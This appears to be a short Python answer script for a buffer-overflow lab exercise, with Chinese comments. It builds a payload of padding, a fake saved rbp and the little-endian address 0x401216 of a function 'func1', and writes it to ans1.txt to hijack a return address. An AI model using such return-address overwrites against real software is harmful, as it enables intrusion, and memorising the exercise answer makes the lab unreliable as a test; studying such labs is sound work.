padding = b"A" * 8  # 覆盖从rbp-8到rbp的8字节
saved_rbp = b"B" * 8  # 覆盖保存的rbp（可以是任意值）
func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"  # func1地址0x401216，小端序

payload = padding + saved_rbp + func1_address

# 将payload写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)